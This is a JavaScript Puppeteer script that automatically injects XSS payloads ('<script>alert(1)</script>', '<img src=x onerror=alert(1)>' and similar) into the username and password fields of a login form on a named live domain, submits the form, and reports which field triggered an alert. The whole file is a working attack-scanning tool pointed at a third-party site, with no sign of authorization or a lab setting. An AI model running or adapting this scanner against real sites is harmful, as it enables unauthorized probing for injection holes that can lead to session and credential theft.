const puppeteer = require('puppeteer');

// Common XSS payloads
const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

// Target page containing the interactive form
const targetUrl = 'https://1w.cash'; 

// Define the fields, including their selectors and what a "SAFE" valid placeholder value looks like
const FORM_FIELDS = [
    { name: 'Username Field', selector: 'input[name="username"]', safeValue: 'valid_test_user' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
    // Add additional fields here if necessary
];

const SUBMIT_SELECTOR = 'button[type="submit"]';

async function scanIsolatedFields() {
    console.log(`[+] Initializing Chromium Browser...`);
    const browser = await puppeteer.launch({ headless: true });

    // OUTER LOOP: Iterate through each field one by one
    for (let targetField of FORM_FIELDS) {
        console.log(`\n==================================================`);
        console.log(`[🚀 TARGETING ISOLATED FIELD]: ${targetField.name}`);
        console.log(`==================================================`);

        // INNER LOOP: Test each payload on the isolated field
        for (let payload of payloads) {
            const page = await browser.newPage();
            
            // Listen for the XSS trigger alert dialog
            page.on('dialog', async dialog => {
                if (dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS DETECTED!] Vulnerable Field: ${targetField.name}`);
                    console.log(`[🎯 Successful Payload]: ${payload}`);
                    await dialog.dismiss();
                }
            });

            try {
                await page.goto(targetUrl, { waitUntil: 'networkidle2' });

                // Fill out the form fields
                for (let currentField of FORM_FIELDS) {
                    await page.waitForSelector(currentField.selector, { timeout: 4000 });
                    await page.click(currentField.selector);
                    
                    // Clear field values
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');

                    // If this is our target field, inject the payload. Otherwise, use safe placeholder data.
                    if (currentField.name === targetField.name) {
                        console.log(`[*] Injecting payload into ${currentField.name}...`);
                        await page.type(currentField.selector, payload);
                    } else {
                        await page.type(currentField.selector, currentField.safeValue);
                    }
                }

                // Submit the form
                await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                await Promise.all([
                    page.click(SUBMIT_SELECTOR),
                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                ]);

                // Wait slightly for DOM rendering
                await new Promise(resolve => setTimeout(resolve, 1000));

            } catch (error) {
                console.log(`[-] Execution interrupted for payload on ${targetField.name}.`);
            } finally {
                await page.close();
            }
        }
    }

    console.log(`\n[+] Isolated Field Scan Campaign Finished.`);
    await browser.close();
}

scanIsolatedFields();
